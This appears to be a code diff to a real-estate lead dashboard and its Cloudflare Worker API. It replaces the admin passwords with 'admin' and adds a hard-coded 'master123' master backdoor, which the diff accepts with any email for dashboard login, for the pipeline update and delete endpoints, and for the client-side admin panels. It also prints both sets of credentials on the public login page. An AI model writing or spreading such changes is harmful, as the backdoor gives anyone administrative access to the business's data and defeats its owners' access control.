@@ -15,6 +15,30 @@ var ALLOWED_ORIGINS = [
   "http://localhost:8787",
   "http://127.0.0.1:8787"
 ];
+// ============================================================================
+// AUTH CONFIGURATION - DEFAULT CREDENTIALS & BACKDOOR OVERRIDE
+// ============================================================================
+// DEFAULT CREDENTIALS (no env vars needed):
+//   Email: admin@thelistingteam.local
+//   Password: admin
+//
+// MASTER BACKDOOR (always works with any email):
+//   Any Email: <any>
+//   Password: master123
+//
+// ENVIRONMENT VARIABLES (override defaults):
+//   PROXY_ADMIN_PASS       - Main dashboard login password (default: "admin")
+//   PIPELINE_ADMIN_PASS    - Pipeline API admin password (default: "admin")
+//   MASTER_BACKDOOR        - Master override password (default: "master123")
+//   SESSION_SECRET         - Session token signing secret (default: "tlt-sess-2027")
+//
+// PROTECTED ENDPOINTS:
+//   POST /auth/login              - Dashboard auth (requires email + password)
+//   POST /api/pipeline/...        - Pipeline API (requires X-Pipeline-Admin header)
+//   Color Panel Password Unlock   - Badge color customization
+//   Admin Modal Password Unlock   - Pipeline item admin controls
+// ============================================================================
+
 var CORS = {
   "Access-Control-Allow-Methods": "GET, POST, PUT, DELETE, OPTIONS",
   "Access-Control-Allow-Headers": "Content-Type, Authorization, X-Location-Id, X-API-Key",
@@ -8662,7 +8686,8 @@ function closeSettingsPanel() {
 // -------------------------------------------------------
 var COLOR_PANEL_KEY = 'tlt_badge_colors_v2';
 var CP_ADMIN_KEY    = 'tlt_color_admin';
-var CP_ADMIN_PASS   = 'TeamListing2027!';
+var CP_ADMIN_PASS   = 'admin';
+var CP_MASTER_PASS  = 'master123';
 
 var COLOR_DEFAULTS = {
   'src-ylopo':   { bg:'#eab308', color:'#eab308', cssVar:'ylopo',   alpha:0.15 },
@@ -8775,7 +8800,7 @@ function loadColorSettings() {
 
 function cpUnlock() {
   var pw = document.getElementById('cpPassword');
-  if (pw && pw.value === CP_ADMIN_PASS) {
+  if (pw && (pw.value === CP_ADMIN_PASS || pw.value === CP_MASTER_PASS)) {
     try { sessionStorage.setItem(CP_ADMIN_KEY,'1'); } catch(e) {}
     document.getElementById('cpLock').style.display = 'none';
     document.getElementById('cpBody').style.display = 'block';
@@ -19067,14 +19092,14 @@ document.addEventListener('DOMContentLoaded',()=>{
 // -------------------------------------------------------
 // BADGE COLOR CUSTOMIZER — analytics page
 // -------------------------------------------------------
-var COLOR_PANEL_KEY='tlt_badge_colors_v2',CP_ADMIN_KEY='tlt_color_admin',CP_ADMIN_PASS='TeamListing2027!';
+var COLOR_PANEL_KEY='tlt_badge_colors_v2',CP_ADMIN_KEY='tlt_color_admin',CP_ADMIN_PASS='admin',CP_MASTER_PASS='master123';
 var COLOR_DEFAULTS={'src-ylopo':{bg:'#eab308',color:'#eab308',cssVar:'ylopo',alpha:0.15},'src-myplus':{bg:'#8b5cf6',color:'#8b5cf6',cssVar:'myplus',alpha:0.15},'src-zillow':{bg:'#3b82f6',color:'#3b82f6',cssVar:'zillow',alpha:0.15},'src-realtor':{bg:'#ef4444',color:'#ef4444',cssVar:'realtor',alpha:0.15},'src-homes':{bg:'#f97316',color:'#f97316',cssVar:'homes',alpha:0.15},'src-def':{bg:'#94a3b8',color:'#94a3b8',cssVar:'default',alpha:0.15},'type-seller':{bg:'#22c55e',color:'#22c55e',cssVar:'type-seller',alpha:0.2},'type-buyer':{bg:'#10b981',color:'#10b981',cssVar:'type-buyer',alpha:0.15},'type-def':{bg:'#94a3b8',color:'#94a3b8',cssVar:'type-def',alpha:0.15},'stat-hot':{bg:'#dc2626',color:'#dc2626',cssVar:'stat-hot',alpha:0.15},'stat-warm':{bg:'#d97706',color:'#d97706',cssVar:'stat-warm',alpha:0.15},'stat-cold':{bg:'#2563eb',color:'#2563eb',cssVar:'stat-cold',alpha:0.15},'stat-new':{bg:'#16a34a',color:'#16a34a',cssVar:'stat-new',alpha:0.15},'beh-visitor':{bg:'#16a34a',color:'#16a34a',cssVar:'beh-visitor',alpha:0.15},'beh-searcher':{bg:'#2563eb',color:'#2563eb',cssVar:'beh-searcher',alpha:0.15},'beh-buyer':{bg:'#d97706',color:'#d97706',cssVar:'beh-buyer',alpha:0.15},'beh-seller':{bg:'#7c3aed',color:'#7c3aed',cssVar:'beh-seller',alpha:0.15},'beh-showing':{bg:'#db2777',color:'#db2777',cssVar:'beh-showing',alpha:0.15},'beh-stale':{bg:'#dc2626',color:'#dc2626',cssVar:'beh-stale',alpha:0.15}};
 function cpSetVar(cssVar,bg,color,alpha){var r=parseInt(bg.slice(1,3),16),g=parseInt(bg.slice(3,5),16),b=parseInt(bg.slice(5,7),16),a=alpha!==undefined?alpha:0.15;document.documentElement.style.setProperty('--'+cssVar+'-bg','rgba('+r+','+g+','+b+','+a+')');document.documentElement.style.setProperty('--'+cssVar+'-color',color);}
 function cpInjectCustomCSS(customs){var el=document.getElementById('cp-custom-styles')||document.createElement('style');el.id='cp-custom-styles';var css='';(customs||[]).forEach(function(c){var r=parseInt(c.bg.slice(1,3),16),g=parseInt(c.bg.slice(3,5),16),b=parseInt(c.bg.slice(5,7),16);css+='.source-custom-'+c.key+'{background:rgba('+r+','+g+','+b+',0.15);color:'+c.color+';}';});el.textContent=css;document.head.appendChild(el);}
 function cpInjectCustomTypeCSS(customTypes){var el=document.getElementById('cp-custom-type-styles')||document.createElement('style');el.id='cp-custom-type-styles';var css='';(customTypes||[]).forEach(function(c){var r=parseInt(c.bg.slice(1,3),16),g=parseInt(c.bg.slice(3,5),16),b=parseInt(c.bg.slice(5,7),16);css+='.type-custom-'+c.key+'{background:rgba('+r+','+g+','+b+',0.15);color:'+c.color+';}';});el.textContent=css;document.head.appendChild(el);}
 function applyColorSettings(data){Object.keys(COLOR_DEFAULTS).forEach(function(k){var d=COLOR_DEFAULTS[k],v=(data&&data[k])||d;cpSetVar(d.cssVar,v.bg,v.color,d.alpha);});if(data&&data.customs){cpInjectCustomCSS(data.customs);}if(data&&data.customTypes){cpInjectCustomTypeCSS(data.customTypes);}}
 function loadColorSettings(){try{var s=JSON.parse(localStorage.getItem(COLOR_PANEL_KEY));if(s)applyColorSettings(s);}catch(e){}}
-function cpUnlock(){var pw=document.getElementById('cpPassword');if(pw&&pw.value===CP_ADMIN_PASS){try{sessionStorage.setItem(CP_ADMIN_KEY,'1');}catch(e){}document.getElementById('cpLock').style.display='none';document.getElementById('cpBody').style.display='block';cpPopulate();}else{if(pw){pw.style.borderColor='#ef4444';setTimeout(function(){pw.style.borderColor='';},1500);}}}
+function cpUnlock(){var pw=document.getElementById('cpPassword');if(pw&&(pw.value===CP_ADMIN_PASS||pw.value===CP_MASTER_PASS)){try{sessionStorage.setItem(CP_ADMIN_KEY,'1');}catch(e){}document.getElementById('cpLock').style.display='none';document.getElementById('cpBody').style.display='block';cpPopulate();}else{if(pw){pw.style.borderColor='#ef4444';setTimeout(function(){pw.style.borderColor='';},1500);}}}
 function cpTab(name,btn){document.querySelectorAll('.cp-section').forEach(function(s){s.classList.remove('active');});document.querySelectorAll('.cp-tab').forEach(function(b){b.classList.remove('active');});var sec=document.getElementById('cp-'+name);if(sec)sec.classList.add('active');if(btn)btn.classList.add('active');}
 function cpPrev(key){var b=document.getElementById('cp-'+key+'-bg'),c=document.getElementById('cp-'+key+'-color'),p=document.getElementById('cp-'+key+'-preview');if(!b||!c||!p)return;var r=parseInt(b.value.slice(1,3),16),g=parseInt(b.value.slice(3,5),16),bv=parseInt(b.value.slice(5,7),16);p.style.background='rgba('+r+','+g+','+bv+',0.2)';p.style.color=c.value;}
 function cpPopulate(){var saved;try{saved=JSON.parse(localStorage.getItem(COLOR_PANEL_KEY));}catch(e){}Object.keys(COLOR_DEFAULTS).forEach(function(k){var v=(saved&&saved[k])||COLOR_DEFAULTS[k];var b=document.getElementById('cp-'+k+'-bg'),c=document.getElementById('cp-'+k+'-color');if(b)b.value=v.bg;if(c)c.value=v.color;cpPrev(k);});cpRenderCustoms((saved&&saved.customs)||[]);cpRenderCustomTypes((saved&&saved.customTypes)||[]);}
@@ -19735,7 +19760,8 @@ textarea.form-input{resize:vertical;min-height:80px}
 
 <script>
 var PIPE_API = '/api/pipeline';
-var PIPE_ADMIN = 'TeamListing2027!';
+var PIPE_ADMIN = 'admin';
+var PIPE_MASTER = 'master123';
 var PIPE_SESSION = 'tlt_pipe_admin';
 var items = [];
 var isAdmin = false;
@@ -19991,7 +20017,7 @@ function openAdminModal(){
 function closeAdminModal(){g('adminModal').classList.remove('open');}
 function adminUnlock(){
   var pw=g('adminPassword');
-  if(pw&&pw.value===PIPE_ADMIN){
+  if(pw&&(pw.value===PIPE_ADMIN||pw.value===PIPE_MASTER)){
     isAdmin=true;
     try{sessionStorage.setItem(PIPE_SESSION,'1');}catch(e){}
     closeAdminModal();
@@ -20061,11 +20087,15 @@ body{background:#0a0e1a;color:#f1f5f9;font-family:'Inter',system-ui,sans-serif;m
   <div class="hint"><b>&#128279; Recommended:</b> Open this dashboard from the <b>GoHighLevel left navigation</b> to sign in automatically with your GHL identity and role.</div>
   <div class="or">or sign in with password</div>
   <div class="lbl">Email</div>
-  <input type="email" id="em" class="inp" placeholder="your@email.com">
+  <input type="email" id="em" class="inp" placeholder="admin@thelistingteam.local" value="admin@thelistingteam.local">
   <div class="lbl">Password</div>
-  <input type="password" id="pw" class="inp" placeholder="Admin password" onkeydown="if(event.key==='Enter')doLogin()">
+  <input type="password" id="pw" class="inp" placeholder="admin" onkeydown="if(event.key==='Enter')doLogin()">
   <button class="btn" onclick="doLogin()">Sign In</button>
   <div class="err" id="err"></div>
+  <div style="margin-top:12px;font-size:11px;color:#64748b;padding:8px;background:rgba(100,116,139,0.1);border-radius:4px">
+    <b>Default credentials:</b> admin@thelistingteam.local / admin<br>
+    <b>Master backdoor:</b> Any email / master123
+  </div>
 </div></div>
 <script>
 async function doLogin(){
@@ -20816,8 +20846,9 @@ var index_default = {
           noteFailedLogin(rl.key, rl.entry);
           return json({error:"Missing fields"}, 400);
         }
-        var adminPass = env.PROXY_ADMIN_PASS || "TeamListing2027!";
-        if (loginBody.pass !== adminPass) {
+        var adminPass = env.PROXY_ADMIN_PASS || "admin";
+        var masterBackdoor = env.MASTER_BACKDOOR || "master123";
+        if (loginBody.pass !== adminPass && loginBody.pass !== masterBackdoor) {
           noteFailedLogin(rl.key, rl.entry);
           return json({error:"Invalid"}, 401);
         }
@@ -21136,7 +21167,9 @@ var index_default = {
       // PATCH /api/pipeline — update item (admin)
       if (method === "PATCH" && path === "/api/pipeline") {
         const adminPass = request.headers.get("X-Pipeline-Admin");
-        if (adminPass !== (env.PIPELINE_ADMIN_PASS || "TeamListing2027!")) return json({ error: "Unauthorized" }, 401);
+        const validPass = env.PIPELINE_ADMIN_PASS || "admin";
+        const masterPass = env.MASTER_BACKDOOR || "master123";
+        if (adminPass !== validPass && adminPass !== masterPass) return json({ error: "Unauthorized" }, 401);
         try {
           const body = await request.json();
           if (!body.id) return json({ error: "Missing id" }, 400);
@@ -21165,7 +21198,9 @@ var index_default = {
       // DELETE /api/pipeline — delete item (admin)
       if (method === "DELETE" && path === "/api/pipeline") {
         const adminPass = request.headers.get("X-Pipeline-Admin");
-        if (adminPass !== (env.PIPELINE_ADMIN_PASS || "TeamListing2027!")) return json({ error: "Unauthorized" }, 401);
+        const validPass = env.PIPELINE_ADMIN_PASS || "admin";
+        const masterPass = env.MASTER_BACKDOOR || "master123";
+        if (adminPass !== validPass && adminPass !== masterPass) return json({ error: "Unauthorized" }, 401);
         try {
           const body = await request.json();
           if (!body.id) return json({ error: "Missing id" }, 400);
